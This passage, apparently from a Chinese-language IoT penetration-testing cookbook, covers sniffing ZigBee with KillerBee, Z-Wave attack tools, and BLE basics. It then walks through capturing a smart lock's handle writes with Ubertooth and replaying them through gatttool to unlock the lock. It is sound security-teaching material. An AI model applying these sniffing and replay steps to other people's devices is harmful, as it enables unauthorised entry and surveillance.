安装 KillerBee 非常简单，可以按照官方 GitHub 存储库上的说明进行操作，链接在这里[`github.com/riverloopsec/killerbee`](https://github.com/riverloopsec/killerbee)。

完成设置后，将 RzUSB 棒插入系统。您应该能够看到 LED 呈琥珀色发光。如果颜色是蓝色，这意味着您的 RzUSB 棒未刷入 KillerBee 固件。我们不会详细介绍刷写固件的说明-因为它在 GitHub 存储库中有很好的文档，并且有许多在线商店可以购买预刷写了 KillerBee 固件的 RzRaven。

# 如何做到...

以下是我们如何开始分析我们周围的 ZigBee 设备并最终使用 RzRaven 和 KillerBee 实用程序嗅探 ZigBee 流量的步骤。

1.  我们将执行的第一步是查看周围的 ZigBee 设备。可以使用`zbid`实用程序来完成，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6d1f581f-6c5a-457d-a409-9b01d0e9b41a.png)

1.  我们还将以下程序刷入了 Arduino。该程序告诉 Arduino 与通过引脚 2 和 3 连接的 XBee 进行交互，并通过 XBee 发送消息`5e87bb4a6cdef053fde67ea9711d51f3`。XBee 发送此流量的通道基于给定 XBee 的编程方式。如果您想要编程自己的 XBee 并指定通道，可以使用实用程序 XCTU：

```
#include <SoftwareSerial.h> 

 int a = 0; 
SoftwareSerial mySerial(2, 3);  

 void setup() { 
Serial.begin(2400); 
} 

void loop() { 
Serial.println("5e87bb4a6cdef053fde67ea9711d51f3"); 
Serial.println(a); 
a++; 
} 
```

1.  接下来，我们将 Xbee 和 Arduino 放入 Xbee Shield 中，这与下图所示的情况类似：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/c7caa28e-2466-4443-a812-afb7ea431c61.png)

1.  打开盾牌并运行`Zbstumbler`，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6c4a07eb-2633-464b-a298-4aabcb6c0b24.png)

正如我们所看到的，我们能够看到在通道 12 上广播的设备。

1.  下一步是嗅探通道 12 上的流量，看看它是否包含任何敏感信息。为此，我们将使用`zbwireshark`实用程序，使用以下语法显示的语法，它将自动在指定语法中的通道上打开 Wireshark 进行 ZigBee 嗅探：

```
sudo ./zbwireshark -c 12
```

1.  正如预期的那样，我们将能够在 Wireshark 中看到所有流量，如下面的屏幕截图所示，以及我们在 Arduino 中编程的敏感字符串：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/fd9456e5-8143-4e84-905c-ac498bc55e9e.png)

# 还有更多...

您还可以执行其他攻击，例如使用 KillerBee 工具套件中的 Zbreplay 等实用程序修改捕获的流量后进行重放攻击。

# 深入了解 Z-Wave

Z-Wave 是无线传感器网络和家庭自动化中的流行协议之一，在美国的频率是 908.42 MHz，在欧洲是 868.42 MHz。Z-Wave 就像 ZigBee 一样支持网状网络，这使其免受节点故障等问题的影响。

它由 Sigma Systems 开发，与 ZigBee 和其他协议相比，它是一个封闭的协议。这也是安全社区对 Z-Wave 的安全研究倡议相对较少的原因之一，与其他流行的物联网协议相比。还有一些项目，如 OpenZWave 提供开源替代方案；然而，它们仍处于非常早期的阶段。

就像典型的无线通信协议一样，Z-Wave 设备遭受相同一组安全问题的影响。 Z-Wave 设备中最常见的漏洞之一是通信中缺乏加密，这使其容易受到敏感信息明文传输和基于重放的攻击的影响。然而，还要注意的是，诸如 Z-Wave 中的 S2 安全等项目大大增加了设备中 Z-Wave 实现的安全性，此外还保护免受针对密钥交换和设备认证的攻击。

# 如何做…

对 Z-Wave 进行攻击的一种流行框架是 EZ-Wave（[`github.com/AFITWiSec/EZ-Wave`](https://github.com/AFITWiSec/EZ-Wave)）由*Joe Hall*和*Ben Ramsey*开发，它使用 Hack RF 硬件对 Z-Wave 协议进行攻击。

EZ-Wave 工具包包括三个工具，如下所示：

+   设备发现和枚举-EZStumbler

+   对已识别设备进行侦察-EZRecon

+   利用-EZFingerprint

评估 Z-Wave 协议的一种方法是捕获传输中的数据包，并查找明文传输的敏感信息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/cd4a557a-930c-4fd0-bb0d-dac8983b8bc0.png)

使用所有前述的构建模块，我们的最终流程图如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/576c7c52-8e9c-4887-a4ab-1a38159dc83c.png)

图像来源：http://oldsmokingjoe.blogspot.in/2016/04/z-wave-protocol-analysis-using-ez-wave.html。

完成后，我们可以选择重放数据包，或者根据我们想要实现的目标修改然后重放。另一类针对 Z-Wave 系统的攻击是从网络中分离/取消配对 Z-Wave 设备节点的攻击，欺骗攻击，干扰和拒绝服务攻击等。

# 理解和利用 BLE

BLE 或蓝牙低功耗是许多智能设备中最常见的平台之一，从智能家居到医疗设备工具，甚至健身追踪器和可穿戴设备都有。 BLE 日益受欢迎的原因之一是我们今天使用的几乎所有智能手机都支持 BLE，因此更容易与基于 BLE 的物联网设备进行交互。

BLE 设计用于资源和功耗受限的设备，BLE 通过提供短暂的远程无线连接有效解决了这个问题，从而显著节省了电池消耗。

BLE 最初是在蓝牙 4.0 规范中引入的，专注于需要极低功耗通信模式的设备，BLE 声称可以在单个纽扣电池上持续几个月到几年。

基于其当前连接和操作阶段，BLE 设备可以以四种不同的模式运行：

+   **中心设备和外围设备**：在这种分类中，扫描广告数据包并发起连接的设备称为中心设备，而广告自己进行连接的设备称为外围设备。一个例子是智能手机作为中心设备，健身追踪器作为外围设备。

+   **广播器和观察者**：顾名思义，广播器是一个广播数据的设备，而观察者是一个扫描广告数据包的设备。然而，与以前的分类类型相比，这里的主要区别是广播器是不可连接的，观察者不能发起连接。例如，一个连续发射温度数据的天气站是一个广播器，而接收广播并在屏幕上显示的显示器是一个观察者。

BLE 由 40 个不同的通道组成——3 个广告通道和 37 个数据通道，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ead3bba8-fc27-4e0e-842e-b8bd8cfdcf93.png)

来源：http://www.connectblue.com/press/articles/shaping-the-wireless-future-with-low-energy-applications-and-systems/

BLE 还执行频率跳频扩频，这意味着它在每个事件上不断改变通道。然而，在接下来的部分中我们将要使用的工具将能够跟踪设备通过跳频，并能够嗅探 BLE 通信的数据。

为了更好地准备好自己，了解蓝牙低功耗的基本概念，这是 BLE 堆栈的外观：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/e4496114-6634-4e2a-8166-f60a868dc25a.png)

图片来源：http://www.embetronicx.com/

如您所见，这里有三个主要层：**应用程序**、**主机**和**控制器**。此外，**主机**和**控制器**通过所谓的**主机控制器接口**（**HCI**）进行交互。

**控制器**包含**链路层**（**LL**）和**LE 物理层**（**PHY**）。物理层负责信号调制和解调的主要任务，并在连接期间计算设备的跳频模式。链路层负责管理许多任务，包括设备的蓝牙地址、加密和连接初始化，以及处理广告数据包。

**主机**层包含我们在 BLE 开发中将直接使用的一些最重要的东西。这些包括**通用访问配置文件**（**GAP**）和**通用属性配置文件**（**GATT**）。

GAP 负责控制大部分广告和连接初始化，以及定义通信中各种设备的角色。

GATT 直接位于 ATT 之上，ATT 负责主/从之间的数据交换，并执行一些操作，如读取、写入和错误处理。GATT 在 ATT 之上添加了一个整体的数据组织层，使其更易于理解。在 GATT 中，整个数据按照给定的图表进行分类：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/6f57e9d2-ac6e-4989-9cbb-203323bac8fc.png)

从上图可以看出，整体数据组织成最低层的**特征**，其中包含**值**和**描述符**。一个例子是每分钟心跳和其值存储在特征中。特征还有一个唯一的 UUID，可以从蓝牙**特殊兴趣组**（**SIG**）数据库中引用，该数据库位于[`www.bluetooth.com/specifications/gatt/characteristics`](https://www.bluetooth.com/specifications/gatt/characteristics)。

接下来，各种相似的特征被封装在服务中。服务的一个例子是`心率服务`，其中包含各种特征，如每分钟心跳、不规则心跳和恐慌发作。服务还有一个 16 位 UUID，可以从蓝牙 SIG 服务 UUID 数据库中引用，该数据库位于[`www.bluetooth.com/specifications/gatt/services`](https://www.bluetooth.com/specifications/gatt/services)。

接下来，整个服务都包含在一个**配置文件**中，这可以是一个通用配置文件，例如心脏健康配置文件，其中包含各种服务，如`heart-rate-service`和`heart-oxygen-service`。

如前所述，在嗅探期间，我们的目标是找到正在读取和写入的特征值。这些特征通常被称为**句柄**，一旦我们捕获到流量，就会看到这些句柄。

接下来，BLE 堆栈的另一个重要组件是 L2CAP。L2CAP 代表逻辑链路控制和适配协议，主要负责从其他层获取数据并将数据封装在适当的 BLE 数据包结构中。

这就是我们开始 BLE 利用所需要知道的全部。现在，让我们开始动手吧。

# 准备工作

要开始进行 BLE 利用，我们需要以下工具：

+   软件：

+   Blue Hydra 或 HCI Utils

+   Ubertooth utils

+   Gattacker

+   硬件：

+   BLE 适配器插头

+   Ubertooth 或类似的 BLE 嗅探器

在处理 BLE 时，我们的方法是首先找出目标设备的地址，同时在执行目标 BLE 设备的操作时嗅探该特定地址的流量。

这将使我们能够找到正在设备上写入以执行某个操作的特定 BLE 句柄。为了更好地了解 BLE 句柄是什么，它们只是对 BLE 特征具有的各种属性的引用。

在本节中，我们将确保我们已经正确设置了一切，如下所示。

确保蓝牙适配器插头连接到您的虚拟机，并且您能够看到`hci`接口，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/2ba5963d-506f-4a75-b767-2547224d0417.png)

接下来，从它们的官方 GitHub 存储库安装以下工具：

+   Blue Hydra（用于对 BLE 设备进行初始侦察）：[`github.com/pwnieexpress/blue_hydra`](https://github.com/pwnieexpress/blue_hydra)

+   Ubertooth Utils（用于对我们的 BLE 设备执行嗅探和数据包捕获）[`github.com/greatscottgadgets/ubertooth`](https://github.com/greatscottgadgets/ubertooth)

+   Wireshark（数据包分析工具，也兼容 BLE）[`www.wireshark.org/download.html`](https://www.wireshark.org/download.html)

一旦您安装和配置了所有这些，我们就准备好开始与周围的 BLE 设备进行交互了。

# 如何做...

1.  我们要做的第一件事是与我们周围的 BLE 设备进行交互，查看周围所有设备并找到它们的蓝牙地址。可以使用以下命令完成：

```
sudo hcitool lescan 
```

1.  这使用 Hcitool 的`lescan`（低功耗扫描）功能来查找附近所有 BLE 广告，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/0db4993d-ecc5-41b0-984c-4bfd38de884f.png)

如您所见，我们能够识别出我们周围的许多设备以及它们的地址。接下来，我们可以使用 Ubertooth 来嗅探给定设备的流量，如下所示。

Ubertooth One 是由*Michael Ossman*的 GreatScottGadgets 开发的设备，用于评估蓝牙设备的安全性。它由 CC2400 2.4 GHz 射频收发器和带有 USB 端口的 NXP LPC1756 微控制器组成。

对于我们作为安全研究人员和渗透测试人员，它可以帮助识别诸如明文数据传输之类的安全问题，还可以识别在网络通信期间正在被写入和读取的句柄。

1.  要使用 Ubertooth 嗅探从给定设备后面的连接，请使用以下语法：

```
sudo ubertooth-btle -f -t [address] -c [capture-output]

```

1.  用设备的地址替换`[address]`，这是我们在上一步骤中识别的设备的地址。

`[capture-output]`可以是文件，也可以是管道，以便进行主动流量拦截。

让我们使用`/tmp/pipe`作为捕获接口，其中一个管道的一端从 Ubertooth 获取输入数据，另一个管道的另一端在 Wireshark 中显示数据。

1.  要做到这一点，打开另一个终端窗口，输入 mkfifo `/tmp/pipe`。完成后，转到 Wireshark | 捕获接口 | 管理接口 | 新接口 | 管道，并添加值`/tmp/pipe`并保存接口。

1.  接下来，在 Wireshark 中开始嗅探`/tmp/pipe`接口，这是您刚刚创建的。根据您执行的操作和目标设备，您将能够在 Wireshark 中看到 BLE 流量显示，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/49e2fa34-64cb-409a-b61b-b99733d53d88.png)

在前面的屏幕截图中，我们还应用了一个过滤器`btl2cap.cid==0x004`，以确保我们获得具有有用数据的数据包。正如您在图像中也可以看到的，我们收到了许多读/写请求，以及句柄的详细信息和写入该特定句柄的值。在这种情况下，句柄 0x0037 和值 1 对应于解锁基于 BLE 的智能锁。

现在我们知道为了执行特定操作而写入句柄的值是什么，我们可以自己写入该特定句柄，而无需 Ubertooth。为此，我们将使用 BLE 适配器和一个名为`gatttool`的实用程序。

1.  要做到这一点，启动`gatttool`，如下所示，以及使用`-b`和`-I`标志提供蓝牙地址并指定在交互模式下打开：

```
sudo gatttool -b [Bluetooth-address] -I 
[gatttool prompt] connect 

```

1.  接下来，我们在这里需要做的就是向目标设备发送写请求，指定我们要写入句柄的值，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/9c233db9-2548-42cc-b0dd-693406dd2ad4.png)

这已经解锁了智能锁，因为智能锁检测到句柄`0x0037`现在具有值`01`，这与智能锁解锁的状态相关。

这就是您可以与基于 BLE 的物联网设备进行交互，找出哪些句柄正在被写入，然后自己写入这些句柄的方法。

1.  您还可以通过查看所有服务的所有值来查看设备的其他属性，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/d6b20658-7c73-4558-84a7-0ed9256ff595.png)

1.  这也可以用于特征，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/iot-pentest-cb/img/ab8644cf-8f85-4823-8441-5cd24cf6ad3d.png)

# 还有更多...

要有效地嗅探 BLE 流量，重要的是要识别可能在任何三个广告信道上进行广告的设备。为此，重要的是要设置三个 Ubertooth 而不是一个。

此外，您可以尝试一些其他工具：

+   **btlejuice**：如果您想要使用 Web GUI 界面对 BLE 流量进行中间人攻击，这是一个方便的工具

+   **Gattacker**：这类似于`btlejuice`，但没有 GUI

+   **BLEah**：这是一个 BLE 信息收集工具
